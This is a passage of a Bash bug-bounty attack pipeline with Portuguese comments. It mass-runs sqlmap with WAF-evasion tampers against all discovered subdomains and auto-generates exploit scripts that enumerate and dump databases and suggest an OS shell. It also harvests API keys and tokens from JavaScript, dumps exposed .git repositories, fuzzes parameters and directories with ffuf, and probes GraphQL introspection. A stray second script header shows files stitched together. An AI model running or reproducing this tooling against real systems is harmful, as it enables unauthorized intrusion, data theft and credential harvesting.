Proxy: $BURP_PROXY_HOST:$BURP_PROXY_PORT
Perfil: $PROFILE

URLs Processadas: $max_urls
Sucessos: $success_count
Falhas: $error_count

Próximos passos:
1. Verifique o Burp Suite para resultados do scan
2. Aguarde conclusão dos scans ativos (pode levar horas)
3. Exporte os resultados quando finalizar

Logs de erro: logs/burp/proxy_errors.log
EOF
    
    log_success "✅ Resumo salvo em: nuclei/burp_scan/scan_summary.txt"
}

# Função sqlmap_testing
sqlmap_testing() {
    if ! command -v sqlmap >/dev/null 2>&1; then
        log_info "SQLMap não disponível"
        touch urls/sqli_candidates.txt urls/sqli_validated.txt
        return 0
    fi
    
    # Preparar alvos para SQLMap BALANCED MODE
    log_info "💉 Iniciando SQLMap BALANCED MODE - Todos domínios/subdomínios"
    send_notification "💉 *SQL INJECTION TESTING - BALANCED MODE*
Testando TODOS domínios e subdomínios para SQLi..."
    
    mkdir -p poc/sqli logs/sqlmap urls/sqli_targets
    
    # ============= COLETAR TODOS OS ALVOS =============
    # 1. URLs com parâmetros descobertos
    if [[ -s urls/with_params.txt ]]; then
        cat urls/with_params.txt >> urls/sqli_targets/all_targets.txt
    fi
    
    # 2. Subdomínios vivos com protocolo
    if [[ -s alive/all_targets_with_protocol.txt ]]; then
        cat alive/all_targets_with_protocol.txt >> urls/sqli_targets/all_targets.txt
    fi
    
    # 3. Hosts vivos principais
    if [[ -s alive/hosts.txt ]]; then
        cat alive/hosts.txt >> urls/sqli_targets/all_targets.txt
    fi
    
    # Dedupli car e limpar
    sort -u urls/sqli_targets/all_targets.txt > urls/sqli_targets/unique_targets.txt
    
    # Identificar candidatos SQLi usando GF
    if command -v gf >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
        cat urls/with_params.txt | gf sqli 2>/dev/null > urls/sqli_candidates.txt || true
    fi
    
    # Adicionar padrões comuns de SQLi se GF não encontrou nada
    if [[ ! -s urls/sqli_candidates.txt ]]; then
        grep -Ei "(\?|&)(id|user|search|query|category|page|item|product|name|email|username|password|key|token)=" \
            urls/sqli_targets/unique_targets.txt > urls/sqli_candidates.txt 2>/dev/null || true
    fi
    
    # Se ainda não temos candidatos, usar sample dos alvos
    if [[ ! -s urls/sqli_candidates.txt ]]; then
        head -n "${SQLMAP_MAX_TARGETS:-50}" urls/sqli_targets/unique_targets.txt > urls/sqli_candidates.txt
    fi
    
    local total_targets=$(safe_count urls/sqli_targets/unique_targets.txt)
    local candidates=$(safe_count urls/sqli_candidates.txt)
    log_info "📊 Total de alvos: $total_targets | Candidatos SQLi: $candidates"
    
    # ============= BALANCED MODE TESTING =============
    local max_tests="${SQLMAP_MAX_TARGETS:-50}"
    local level="${SQLMAP_LEVEL:-2}"
    local risk="${SQLMAP_RISK:-1}"
    local threads="${SQLMAP_THREADS:-3}"
    
    log_info "⚙️  SQLMap Config: Level=$level, Risk=$risk, Threads=$threads, Max=$max_tests"
    
    local current=0
    > urls/sqli_validated.txt
    
    head -n "$max_tests" urls/sqli_candidates.txt | while IFS= read -r url && [[ $current -lt $max_tests ]]; do
        [[ -z "$url" ]] && continue
        current=$((current + 1))
        
        log_info "[SQLMap BALANCED $current/$max_tests] Testando: $url"
        
        local url_hash=$(echo "$url" | md5sum | cut -c1-10)
        local log_file="logs/sqlmap/balanced_${url_hash}.txt"
        
        # SQLMap BALANCED MODE - equilíbrio entre eficiência e cobertura
        timeout 600s sqlmap \
            -u "$url" \
            --batch \
            --level="$level" \
            --risk="$risk" \
            --threads="$threads" \
            --random-agent \
            --technique=BEUST \
            --tamper=space2comment,between,randomcase \
            --crawl=3 \
            --forms \
            --smart \
            --answers="follow=N,crack=N,dict=N,keep=Y" \
            --timeout=90 \
            --retries=3 \
            --delay=0 \
            --time-sec=8 \
            --union-cols=30 \
            --flush-session \
            --output-dir="poc/sqli" \
            > "$log_file" 2>&1 || {
                echo "[TIMEOUT/ERROR] $url" >> logs/sqlmap/errors.log
                continue
            }
        
        # Verificar se encontrou vulnerabilidade
        if grep -qiE "parameter.*is vulnerable|sqlmap identified the following injection point|payload.*worked|Type:.*injectable" "$log_file"; then
            echo "$url" >> urls/sqli_validated.txt
            log_info "🚨 VULNERABILIDADE SQLi ENCONTRADA: $url"
            
            send_notification "🚨 *SQL INJECTION FOUND!*
💉 URL: \`$url\`
📊 Level: $level, Risk: $risk
🔍 Log: logs/sqlmap/balanced_${url_hash}.txt" "true"
            
            # Gerar PoC de exploração
            cat > "poc/sqli/exploit_${url_hash}.sh" <<SQLPOC
#!/bin/bash
# SQLi Balanced Mode exploit para: $url
# Encontrada em: $(date)
# SQLMap Config: Level=$level, Risk=$risk

echo "=== SQLi Exploitation PoC - BALANCED MODE ==="
echo "Target: $url"
echo ""

echo "1. Listando databases:"
sqlmap -u "$url" --batch --dbs --threads=$threads

echo ""
echo "2. Enumerar tabelas de database específica:"
echo "sqlmap -u '$url' --batch -D <DATABASE> --tables"

echo ""
echo "3. Dump de tabela específica:"
echo "sqlmap -u '$url' --batch -D <DATABASE> -T <TABLE> --dump"

echo ""
echo "4. Detecção de WAF/IPS:"
sqlmap -u "$url" --batch --identify-waf

echo ""
echo "⚠️  ATENÇÃO: Use apenas com autorização explícita!"
SQLPOC
            chmod +x "poc/sqli/exploit_${url_hash}.sh"
        fi
        
        # Pequeno delay entre testes
        sleep 1
    done
    
    local sqli_found=$(safe_count urls/sqli_validated.txt)
    log_info "✅ SQLMap BALANCED MODE completo. Vulnerabilidades: $sqli_found"
    
    if [[ "$sqli_found" -gt 0 ]]; then
        send_notification "🚨 *SQLi VULNERABILITIES - BALANCED MODE*
💥 $sqli_found SQL injections confirmadas!
📁 PoCs: poc/sqli/
📊 Testados: $current alvos
⚠️ REVISÃO MANUAL NECESSÁRIA!" true
    else
        send_notification "✅ *SQLi BALANCED MODE COMPLETE*
🛡️ Nenhuma vulnerabilidade SQLi confirmada
📊 Testados: $current alvos de $total_targets totais"
    fi
}

# Função sqlmap_subdomain_testing - BRUTAL SCAN nos SUBDOMÍNIOS
sqlmap_subdomain_testing() {
    if command -v sqlmap >/dev/null 2>&1 && [[ -s alive/all_targets_with_protocol.txt ]]; then
        log_info "💉 Iniciando SQLMap SUBDOMAIN scan BRUTAL..."
        send_notification "💉 *SQLMAP SUBDOMAIN SCAN*
Testando subdomínios com --crawl e --forms..."
        
        mkdir -p poc/sqli_subdomains logs/sqlmap/subdomains
        
        # Pegar amostra estratégica de subdomínios
        local max_subs=50
        [[ "$PROFILE" = "light" ]] && max_subs=20
        [[ "$PROFILE" = "aggressive" ]] && max_subs=100
        [[ "$PROFILE" = "kamikaze" ]] && max_subs=200
        
        head -n "$max_subs" alive/all_targets_with_protocol.txt > urls/subdomain_sample.txt
        
        local total_subs=$(safe_count urls/subdomain_sample.txt)
        log_info "📊 Testando $total_subs subdomínios com SQLMap..."
        
        local sqli_confirmed=0
        local current=0
        > urls/sqli_subdomains_validated.txt
        
        while IFS= read -r target && [[ $current -lt $max_subs ]]; do
            [[ -z "$target" ]] && continue
            current=$((current + 1))
            
            local domain_hash=$(echo "$target" | md5sum | cut -d' ' -f1 | cut -c1-8)
            local log_file="logs/sqlmap/subdomains/sqlmap_${domain_hash}.txt"
            
            log_info "[SQLMap Subdomain $current/$total_subs] Testando: $target"
            
            # SQLMap com crawl e forms para descobrir pontos de injeção
            timeout 300s sqlmap \
                -u "$target" \
                --batch \
                --crawl=5 \
                --forms \
                --random-agent \
                --level="$SQLMAP_LEVEL" \
                --risk="$SQLMAP_RISK" \
                --threads=5 \
                --technique=BEUSTQ \
                --timeout=30 \
                --retries=1 \
                --smart \
                --output-dir="poc/sqli_subdomains" \
                > "$log_file" 2>&1 || {
                    echo "[TIMEOUT/ERROR] $target" >> logs/sqlmap/subdomain_errors.log
                    continue
                }
            
            # Verificar se encontrou vulnerabilidade
            if grep -qiE "parameter.*is vulnerable|sqlmap identified the following injection point|payload.*worked" "$log_file"; then
                ((sqli_confirmed++))
                echo "$target" >> urls/sqli_subdomains_validated.txt
                log_info "🚨 VULNERABILIDADE SQLi CONFIRMADA: $target"
                
                # Enviar notificação urgente
                send_notification "🚨 *SQLi FOUND IN SUBDOMAIN!*
💉 Target: \`$target\`
🔍 Logs: logs/sqlmap/subdomains/" "true"
                
                # Gerar script PoC
                cat > "poc/sqli_subdomains/exploit_${domain_hash}.sh" <<'SUBPOC'
#!/bin/bash
# SQLi exploit para subdomain: $target
# Descoberto em: $(date)

echo "=== SQLi Subdomain Exploitation PoC ==="
echo "Target: $target"
echo ""

echo "1. Re-executar crawl completo:"
sqlmap -u "$target" --batch --crawl=10 --forms --dbs

echo ""
echo "2. Para dump de databases:"
echo "sqlmap -u '$target' --crawl=5 --forms -D DATABASE_NAME --dump"

echo ""
echo "3. Shell interativo (apenas com autorização):"
echo "sqlmap -u '$target' --os-shell"
SUBPOC
                chmod +x "poc/sqli_subdomains/exploit_${domain_hash}.sh"
            fi
            
        done < urls/subdomain_sample.txt
        
        log_info "SQLMap subdomain scan completo. Vulnerabilidades SQLi encontradas: $sqli_confirmed"
        
        if [[ "$sqli_confirmed" -gt 0 ]]; then
            send_notification "🚨 *SQLi IN SUBDOMAINS CONFIRMED*
💥 $sqli_confirmed subdomain(s) vulnerable!
📁 PoCs: poc/sqli_subdomains/
⚠️ REVISÃO URGENTE!" true
        else
            send_notification "✅ *SUBDOMAIN SQLi SCAN COMPLETE*
🛡️ Nenhuma vulnerabilidade SQLi nos subdomínios testados"
        fi
    else
        log_info "SQLMap não disponível ou nenhum subdomain vivo encontrado"
        touch urls/subdomain_sample.txt urls/sqli_subdomains_validated.txt
    fi
}

# ============= FASE 5: VULNERABILITY SCANNING =============
echo ""
echo "========== FASE 5: VULNERABILITY SCANNING =========="
send_notification "🎯 *NUCLEI VULNERABILITY SCAN*  
Iniciando varredura de vulnerabilidades..."

if [ "${DRY_RUN:-false}" != "true" ]; then
    nuclei_scanning
    xss_testing
    sqlmap_testing
    sqlmap_subdomain_testing  # NOVO: SQLMap nos subdomínios
else
    log_info "DRY-RUN: Pulando vulnerability scanning"
    mkdir -p nuclei
    : > nuclei/nuclei_hosts_fast.txt
    : > nuclei/nuclei_urls_fast.txt
    : > nuclei/nuclei_hosts_ext.txt
    : > nuclei/dalfox_results.txt
fi

# ============= SECRETS HUNTING APRIMORADO =============
echo ""
echo "========== SECRETS HUNTING =========="
send_notification "🔑 *SECRETS HUNTING*
Analisando arquivos JS para secrets..."

secrets_hunting() {
    mkdir -p secrets
    
    if [[ -d js/downloads ]] && [[ "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "Escaneando arquivos JavaScript para secrets..."
        
        grep -IrohE "AKIA[0-9A-Z]{16}" js/downloads/* 2>/dev/null | sort -u > secrets/aws_keys.txt || true
        grep -IrohE "AIza[0-9A-Za-z\\-_]{35}" js/downloads/* 2>/dev/null | sort -u > secrets/google_api_keys.txt || true
        grep -IrohE "firebase[_-]?api[_-]?key[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{20,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/firebase_keys.txt || true
        grep -IrohE "eyJ[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{20,}" js/downloads/* 2>/dev/null | sort -u > secrets/jwt_tokens.txt || true
        grep -IrohE "ghp_[0-9A-Za-z]{36}" js/downloads/* 2>/dev/null | sort -u > secrets/github_tokens.txt || true
        grep -IrohE "sk_live_[0-9a-zA-Z]{24}" js/downloads/* 2>/dev/null | sort -u > secrets/stripe_keys.txt || true
        grep -IrohE "(api[_-]?key|apikey|access[_-]?token)[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{16,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/generic_api_keys.txt || true
        local AWS_SECRETS=$(safe_count secrets/aws_keys.txt)
        local GOOGLE_SECRETS=$(safe_count secrets/google_api_keys.txt)
        local JWT_SECRETS=$(safe_count secrets/jwt_tokens.txt)
        local GITHUB_SECRETS=$(safe_count secrets/github_tokens.txt)
        local STRIPE_SECRETS=$(safe_count secrets/stripe_keys.txt)
        
        local TOTAL_SECRETS=$((AWS_SECRETS + GOOGLE_SECRETS + JWT_SECRETS + GITHUB_SECRETS + STRIPE_SECRETS))
        
        if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
            log_info "⚠️  SECRETS ENCONTRADOS: $TOTAL_SECRETS"
        fi
    else
        log_info "Nenhum arquivo JS encontrado para análise de secrets"
        touch secrets/aws_keys.txt secrets/google_api_keys.txt secrets/jwt_tokens.txt
        TOTAL_SECRETS=0
    fi
}

secrets_hunting

# ============= CLASSIFICAÇÃO GF MELHORADA =============
echo ""
echo "========== GF CLASSIFICATION =========="
send_notification "🔍 *GF CLASSIFICATION*
Classificando URLs por tipo de vulnerabilidade..."

gf_classification() {
    if command -v gf >/dev/null 2>&1 && [[ -s urls/all_urls_raw.txt ]]; then
        log_info "Executando classificação gf contra todas as URLs..."
        
        cat urls/all_urls_raw.txt | gf xss 2>/dev/null | sort -u > urls/gf_xss.txt || true
        cat urls/all_urls_raw.txt | gf sqli 2>/dev/null | sort -u > urls/gf_sqli.txt || true
        cat urls/all_urls_raw.txt | gf lfi 2>/dev/null | sort -u > urls/gf_lfi.txt || true
        cat urls/all_urls_raw.txt | gf ssrf 2>/dev/null | sort -u > urls/gf_ssrf.txt || true
        cat urls/all_urls_raw.txt | gf redirect 2>/dev/null | sort -u > urls/gf_redirect.txt || true
        cat urls/all_urls_raw.txt | gf rce 2>/dev/null | sort -u > urls/gf_rce.txt || true
        
    else
        log_info "gf não disponível ou nenhuma URL para classificar"
        touch urls/gf_xss.txt urls/gf_sqli.txt urls/gf_lfi.txt urls/gf_ssrf.txt urls/gf_redirect.txt urls/gf_rce.txt
    fi
}

gf_classification

XSS_CANDIDATES=$(safe_count urls/gf_xss.txt)
SQLI_CANDIDATES=$(safe_count urls/gf_sqli.txt)
LFI_CANDIDATES=$(safe_count urls/gf_lfi.txt)
SSRF_CANDIDATES=$(safe_count urls/gf_ssrf.txt)

# ============= FASE 6: EXTRA TOOLS EXECUTION =============
echo ""
echo "========== FASE 6: EXTRA TOOLS SCANNING =========="
send_notification "🔧 *FASE 6: EXTRA TOOLS*
Executando ferramentas avançadas de reconhecimento e exploração..."

# ============= FUNÇÃO WRAPPER PARA EXECUÇÃO COM FALLBACK =============
run_tool_safe() {
    local tool_name="$1"
    local tool_command="$2"
    local log_file="logs/extra_tools/${tool_name}.log"
    local error_file="logs/extra_tools/${tool_name}_error.log"
    
    if ! command -v "$tool_name" >/dev/null 2>&1; then
        log_info "⚠️  $tool_name não instalado - pulando..."
        echo "Tool not installed" > "$log_file"
        return 1
    fi
    
    log_info "▶️  Executando $tool_name..."
    
    if eval "$tool_command" > "$log_file" 2> "$error_file"; then
        log_info "✅ $tool_name completo"
        return 0
    else
        log_error "❌ $tool_name falhou - veja $error_file"
        return 1
    fi
}

# ============= KXSS - XSS Detection =============
run_kxss() {
    if [[ ! -s urls/gf_xss.txt ]]; then
        log_info "⚠️  Nenhuma URL XSS candidata encontrada - pulando kxss"
        return 0
    fi
    
    run_tool_safe "kxss" "cat urls/gf_xss.txt | head -100 | kxss | tee reports/kxss/kxss_results.txt"
}

# ============= LINKFINDER - Extract Endpoints from JS =============
run_linkfinder() {
    if [[ ! -d js/downloads ]] || [[ ! "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "⚠️  Nenhum arquivo JS baixado - pulando linkfinder"
        return 0
    fi
    
    if command -v linkfinder >/dev/null 2>&1; then
        log_info "▶️  Executando linkfinder em arquivos JS..."
        mkdir -p reports/linkfinder
        
        find js/downloads -type f -name "*.js" | head -50 | while read -r jsfile; do
            safe_name=$(basename "$jsfile" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 30s linkfinder -i "$jsfile" -o cli 2>/dev/null >> reports/linkfinder/endpoints_${safe_name}.txt || true
        done
        
        cat reports/linkfinder/endpoints_*.txt 2>/dev/null | sort -u > reports/linkfinder/all_endpoints.txt || true
        log_info "✅ linkfinder completo"
    fi
}

# ============= PARAMSPIDER - Parameter Discovery =============
run_paramspider() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando paramspider"
        return 0
    fi
    
    if command -v paramspider >/dev/null 2>&1; then
        log_info "▶️  Executando paramspider..."
        mkdir -p reports/paramspider
        
        head -10 alive/hosts_only.txt | while read -r domain; do
            safe_name=$(echo "$domain" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 180s paramspider -d "$domain" --output reports/paramspider/params_${safe_name}.txt 2>/dev/null || true
        done
        
        cat reports/paramspider/params_*.txt 2>/dev/null | sort -u > reports/paramspider/all_params.txt || true
        log_info "✅ paramspider completo"
    fi
}

# ============= ARJUN - Parameter Bruteforce =============
run_arjun() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando arjun"
        return 0
    fi
    
    if command -v arjun >/dev/null 2>&1; then
        log_info "▶️  Executando arjun..."
        mkdir -p reports/arjun
        
        head -5 alive/hosts.txt | while read -r url; do
            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 300s arjun -u "$url" -oJ reports/arjun/params_${safe_name}.json -t "$PARALLEL_HOSTS" 2>/dev/null || true
        done
        
        log_info "✅ arjun completo"
    fi
}

# ============= SECRETFINDER - Find Secrets in JS =============
run_secretfinder() {
    if [[ ! -d js/downloads ]] || [[ ! "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "⚠️  Nenhum arquivo JS - pulando secretfinder"
        return 0
    fi
    
    if command -v SecretFinder >/dev/null 2>&1 || command -v secretfinder >/dev/null 2>&1; then
        log_info "▶️  Executando secretfinder..."
        mkdir -p reports/secretfinder
        
        SECRETFINDER_CMD=$(command -v SecretFinder || command -v secretfinder)
        
        find js/downloads -type f -name "*.js" | head -50 | while read -r jsfile; do
            safe_name=$(basename "$jsfile" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 30s python3 "$SECRETFINDER_CMD" -i "$jsfile" -o cli 2>/dev/null >> reports/secretfinder/secrets_${safe_name}.txt || true
        done
        
        cat reports/secretfinder/secrets_*.txt 2>/dev/null | grep -Ei "API|KEY|TOKEN|SECRET|PASSWORD" | sort -u > reports/secretfinder/all_secrets.txt || true
        log_info "✅ secretfinder completo"
    fi
}

# ============= TRUFFLEHOG - Git Secrets Scanner =============
run_trufflehog() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando trufflehog"
        return 0
    fi
    
    if command -v trufflehog >/dev/null 2>&1; then
        log_info "▶️  Executando trufflehog em hosts..."
        mkdir -p reports/trufflehog
        
        head -5 alive/hosts_only.txt | while read -r domain; do
            safe_name=$(echo "$domain" | sed 's/[^a-zA-Z0-9._-]/_/g')
            # Tentar escanear repositório se disponível
            timeout 300s trufflehog https://github.com/${domain} --json > reports/trufflehog/secrets_${safe_name}.json 2>/dev/null || true
        done
        
        log_info "✅ trufflehog completo"
    fi
}

# ============= GITLEAKS - Git Secrets Scanner =============
run_gitleaks() {
    if [[ ! -d js/downloads ]] || [[ ! "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "⚠️  Nenhum arquivo para escanear - pulando gitleaks"
        return 0
    fi
    
    if command -v gitleaks >/dev/null 2>&1; then
        log_info "▶️  Executando gitleaks..."
        mkdir -p reports/gitleaks
        
        timeout 300s gitleaks detect --source js/downloads --report-path reports/gitleaks/report.json --no-git 2>/dev/null || true
        log_info "✅ gitleaks completo"
    fi
}

# ============= GIT-DUMPER - Dump Exposed .git =============
run_git_dumper() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando git-dumper"
        return 0
    fi
    
    if command -v git-dumper >/dev/null 2>&1; then
        log_info "▶️  Executando git-dumper..."
        mkdir -p reports/git_dumper
        
        head -5 alive/hosts.txt | while read -r url; do
            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9._-]/_/g')
            git_url="${url}/.git/"
            
            # Verificar se .git está exposto
            if curl -s -m 10 "${git_url}HEAD" | grep -q "ref:"; then
                log_info "🔥 .git exposto encontrado em: $url"
                timeout 300s git-dumper "$git_url" "reports/git_dumper/${safe_name}" 2>/dev/null || true
            fi
        done
        
        log_info "✅ git-dumper completo"
    fi
}

# ============= FFUF - PARAMETER FUZZING =============
#!/usr/bin/env bash
# BRUTAL EXTENSIONS - Funcionalidades Adicionais Ultra-Agressivas
# Para integrar com bugbounty-scanner-ULTIMATE-BRUTAL.sh

# ============= FFUF PARAMETER FUZZING BRUTAL =============
run_ffuf_param_fuzz() {
    if [[ ! -s urls/with_params.txt ]]; then
        log_info "⚠️  No parameterized URLs - skipping ffuf param fuzzing"
        return 0
    fi
    
    if ! command -v ffuf >/dev/null 2>&1; then
        log_info "⚠️  ffuf not installed"
        log_info "💡 Install with: go install github.com/ffuf/ffuf/v2@latest"
        return 0
    fi
    
    log_info "🔥 Running FFUF Parameter Fuzzing BRUTAL..."
    mkdir -p reports/ffuf logs
    
    # Large parameter wordlist
    local param_wordlist="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
    if [[ ! -f "$param_wordlist" ]]; then
        param_wordlist="/usr/share/wordlists/dirb/common.txt"
    fi
    
    # Timeout settings (10 minutes global for this module, 10s per request)
    local shell_timeout=660       # Shell timeout (11 min - slightly more than maxtime)
    local ffuf_maxtime=600        # FFUF internal maxtime (10 minutes)
    local req_timeout=10          # Per-request timeout (10 seconds)
    
    local max_urls=20
    [[ "$PROFILE" = "aggressive" ]] && max_urls=50
    [[ "$PROFILE" = "kamikaze" ]] && max_urls=100
    
    local count=0
    local total_urls=$(head -n "$max_urls" urls/with_params.txt | wc -l)
    
    head -n "$max_urls" urls/with_params.txt | while IFS= read -r url || [[ -n "$url" ]]; do
        # Skip empty lines
        [[ -z "$url" ]] && continue
        
        count=$((count + 1))
        safe=$(echo "$url" | md5sum | cut -c1-10)
        log_info "[$count/$total_urls] FFUF Param Fuzzing: $url"
        
        # Run ffuf with shell timeout wrapper + internal timeouts
        # If ffuf hangs or times out, log error and continue to next URL
        timeout "${shell_timeout}s" ffuf -u "${url}&FUZZ=test" \
            -w "$param_wordlist" \
            -mc 200,204,301,302,307,401,403 \
            -fc 404 \
            -t 50 \
            -rate 100 \
            -p 0.1-0.5 \
            -timeout "$req_timeout" \
            -maxtime "$ffuf_maxtime" \
            -ac \
            -se \
            -o "reports/ffuf/params_${safe}.json" \
            2>>logs/ffuf_errors.log
        
        local exit_code=$?
        if [[ $exit_code -ne 0 ]]; then
            # 124 = GNU timeout, 137 = killed
            if [[ $exit_code -eq 124 || $exit_code -eq 137 ]]; then
                log_error "[!] FFUF TIMEOUT for URL: $url - Skipping to next target"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] TIMEOUT: $url (limit ${ffuf_maxtime}s, req-timeout ${req_timeout}s)" >> logs/ffuf_timeouts.log
            else
                log_error "[!] FFUF failed for URL: $url (exit code: $exit_code) - Skipping to next target"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $url (exit code: $exit_code)" >> logs/ffuf_errors.log
            fi
            continue
        fi
        
        log_info "[OK] FFUF completed for: $url"
    done
    
    # Consolidate discovered parameters
    if ls reports/ffuf/params_*.json >/dev/null 2>&1; then
        jq -r '.results[] | .input.FUZZ' reports/ffuf/params_*.json 2>/dev/null | \
            sort -u > reports/ffuf/all_hidden_params.txt || true
        local param_count=$(wc -l < reports/ffuf/all_hidden_params.txt 2>/dev/null || echo 0)
        log_success "✅ FFUF found $param_count hidden parameters"
    fi
    
    # Report any timeouts
    if [[ -s logs/ffuf_timeouts.log ]]; then
        local timeout_count=$(wc -l < logs/ffuf_timeouts.log)
        log_warn "⚠️  $timeout_count URLs timed out during param fuzzing (see logs/ffuf_timeouts.log)"
    fi
}

# ============= FFUF DIRECTORY BRUTEFORCE BRUTAL =============
run_ffuf_dir_fuzz() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando ffuf directory fuzzing"
        return 0
    fi
    
    if ! command -v ffuf >/dev/null 2>&1; then
        return 0
    fi
    
    log_info "🔥 Executando FFUF Directory Bruteforce AGRESSIVO..."
    mkdir -p reports/ffuf/directories
    
    local wordlist="/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt"
    if [[ ! -f "$wordlist" ]]; then
        wordlist="/usr/share/wordlists/dirb/common.txt"
    fi
    
    local max_hosts=10
    [[ "$PROFILE" = "aggressive" ]] && max_hosts=25
    [[ "$PROFILE" = "kamikaze" ]] && max_hosts=50
    
    local count=0
    head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
        count=$((count + 1))
        safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
        log_info "[$count/$max_hosts] FFUF Directory: $url"
        
        timeout 300s ffuf -u "${url}/FUZZ" \
            -w "$wordlist" \
            -mc 200,204,301,302,307,401,403 \
            -fc 404 \
            -t 50 \
            -rate 100 \
            -p 0.2-0.8 \
            -timeout 10 \
            -maxtime 240 \
            -recursion \
            -recursion-depth 1 \
            -ac \
            -se \
            -o "reports/ffuf/directories/dir_${safe}.json" \
            2>>logs/ffuf_dir_errors.log || true
    done
    
    log_success "✅ FFUF directory bruteforce completo"
}
# ============= GRAPHQL INTROSPECTION (LAZY CREATION) =============
run_graphql_introspection() {
    # FAIL-FAST: Verificar se existe input ANTES de qualquer processamento
    if [[ ! -s apis/api_endpoints.txt ]] && [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  No API endpoints and no alive hosts - skipping GraphQL introspection"
        return 0
    fi
    
    log_info "🔥 Running GraphQL Introspection (Lazy Mode)..."
    
    # Criar diretório temporário para outputs (será movido apenas se houver resultados)
    local temp_dir=$(mktemp -d /tmp/graphql_scan_XXXXXX)
    
    # Timeout settings to prevent hangs
    local req_timeout=300         # Per-request hard timeout (seconds) = 5 minutes
    local connect_timeout=10      # Connect timeout (seconds)
    local max_endpoints=50        # Max endpoints to test
    local global_timeout=1800     # Global timeout for entire function (30 min)
    
    # Build candidates list in temp
    local candidates_file="$temp_dir/graphql_candidates.txt"
    local vulnerable_file="$temp_dir/vulnerable_endpoints.txt"
    
    # Look for GraphQL endpoints (if api_endpoints exists)
    if [[ -s apis/api_endpoints.txt ]]; then
        grep -iE "graphql|gql" apis/api_endpoints.txt > "$candidates_file" 2>/dev/null || true
    fi
    
    # If not found, test common endpoints from alive hosts
    if [[ ! -s "$candidates_file" ]] && [[ -s alive/hosts.txt ]]; then
        head -10 alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            for path in /graphql /api/graphql /v1/graphql /gql /api/gql; do
                echo "${url}${path}" >> "$candidates_file"
            done
        done
    fi
    
    # FAIL-FAST: Se ainda não há candidatos, limpar e sair
    if [[ ! -s "$candidates_file" ]]; then
        log_info "⚠️  No GraphQL endpoints found to test"
        rm -rf "$temp_dir"
        return 0
    fi
    
    # Introspection query
    local introspection_query='{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated: true) { name args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } }"}'
    
    local count=0
    local total_endpoints=$(head -n "$max_endpoints" "$candidates_file" | wc -l)
    
    # Use timeout wrapper for entire loop to prevent infinite hangs
    (
        head -n "$max_endpoints" "$candidates_file" | while IFS= read -r endpoint || [[ -n "$endpoint" ]]; do
            # Skip empty lines
            [[ -z "$endpoint" ]] && continue
            
            count=$((count + 1))
            safe=$(echo "$endpoint" | sed 's/[^a-zA-Z0-9]/_/g')
            log_info "[$count/$total_endpoints] Testing GraphQL: $endpoint"
            
            local output_file="$temp_dir/introspection_${safe}.json"
            
            # Test introspection with timeouts
            if command -v timeout >/dev/null 2>&1; then
                timeout "${req_timeout}s" curl -X POST "$endpoint" \
                    -H "Content-Type: application/json" \
                    -H "User-Agent: Mozilla/5.0" \
                    -d "$introspection_query" \
                    --connect-timeout "$connect_timeout" \
                    --max-time "$req_timeout" \
                    -s -o "$output_file" 2>/dev/null
            else
                curl -X POST "$endpoint" \
                    -H "Content-Type: application/json" \
                    -H "User-Agent: Mozilla/5.0" \
                    -d "$introspection_query" \
                    --connect-timeout "$connect_timeout" \
                    --max-time "$req_timeout" \
                    -s -o "$output_file" 2>/dev/null
            fi
            
            local exit_code=$?
            if [[ $exit_code -ne 0 ]]; then
                if [[ $exit_code -eq 124 ]]; then
                    log_warn "[!] GraphQL TIMEOUT (${req_timeout}s) for: $endpoint - Skipping"
                    echo "[$(date '+%Y-%m-%d %H:%M:%S')] TIMEOUT: $endpoint" >> "$temp_dir/graphql_timeouts.log"
                else
                    log_warn "[!] GraphQL request failed for: $endpoint (exit: $exit_code) - Skipping"
                    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $endpoint (exit: $exit_code)" >> "$temp_dir/graphql_errors.log"
                fi
                # Limpar arquivo vazio se existir
                [[ -f "$output_file" ]] && [[ ! -s "$output_file" ]] && rm -f "$output_file"
                continue
            fi
            
            # Check if introspection worked AND file has content
            if [[ -s "$output_file" ]]; then
                if grep -q "__schema" "$output_file"; then
                    log_success "✅ Introspection enabled at: $endpoint"
                    echo "$endpoint" >> "$vulnerable_file"
                else
                    # Response não contém dados úteis - remover
                    rm -f "$output_file"
                fi
            else
                # Arquivo vazio - remover
                rm -f "$output_file"
            fi
        done
    ) &
    
    # Wait for subshell with global timeout
    local subshell_pid=$!
    if ! timeout "${global_timeout}s" tail --pid="$subshell_pid" -f /dev/null 2>/dev/null; then
